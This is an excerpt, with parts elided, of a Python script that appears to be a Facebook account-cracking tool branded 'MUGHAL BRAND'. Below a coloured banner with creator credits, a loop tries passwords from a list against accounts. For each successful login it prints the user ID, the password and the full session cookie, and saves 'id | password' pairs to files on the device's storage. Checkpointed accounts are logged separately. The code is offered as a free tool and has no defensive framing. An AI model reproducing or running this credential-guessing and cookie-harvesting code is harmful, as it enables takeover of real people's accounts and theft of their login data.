...
def o():
    os.system('clear')
    jalan(logo)
    jalan('𝑴𝑼𝑮𝑯𝑨𝑳 𝑩𝑹𝑨𝑵𝑫 𝑹𝑨𝑵𝑫𝑶𝑴 𝑻𝑶𝑶𝑳')
    print('')
...
\033[1;37m================= \33[32;45mƁƦƛƝƊ\33[0;m =====================
\033[1;32m     \033[1;33mCREATED BY\33[0;m   :  \033[1;33m𝙈𝙐𝙂𝙃𝘼𝙇 𝘽𝙍𝘼𝙉𝘿\33[0;m\033[1;32m && \033[1;33m𝙓𝘿\33[0;m
\033[1;32m     \033[1;32mFACEBOK      : \033[1;34m 𝙈𝙐𝙂𝙃𝘼𝙇 𝙕𝘼𝘿𝘼
\033[1;32m     \033[1;35mGITHUB       :  \033[1;35m𝙈𝙐𝙂𝙃𝘼𝙇 𝘽𝙍𝘼𝙉𝘿_𝙓𝘿
\033[1;32m     \033[1;36mTOOL STATUS  :  \033[1;36m𝙏𝙊𝙊𝙇 𝙄𝙎 𝙁𝙍𝙀𝙀
\033[1;32m     \033[1;35mTEAM         :  \033[1;35m𝙈.𝘽𝙍𝘼𝙉𝘿
\033[1;32m     \033[1;36mTOOL VIRSION :  \033[1;36m0.2
\033[1;37m================= \33[32;45mƁƦƛƝƊ_ҲƊ\33[0;m =====================
 
       \33[37;41m\t 𝐖𝐄𝐋𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐌𝐔𝐆𝐇𝐀𝐋.𝐁𝐑𝐀𝐍𝐃 𝐓𝐎𝐎𝐋\33[0;m
 
\033[1;37m================== \33[32;45m𝐌.𝐁𝐑𝐀𝐍𝐃\33[0;m ======================\n""")
loop = 0
oks = []
cps = []
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \033[1;32m(𝑴.𝑩𝑹𝑨𝑵𝑫-OK)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/𝑴.𝑩𝑹𝑨𝑵𝑫-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m(𝑴.𝑩𝑹𝑨𝑵𝑫-CP)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/𝑴.𝑩𝑹𝑨𝑵𝑫-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r     %s[𝑴.𝑩𝑹𝑨𝑵𝑫] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
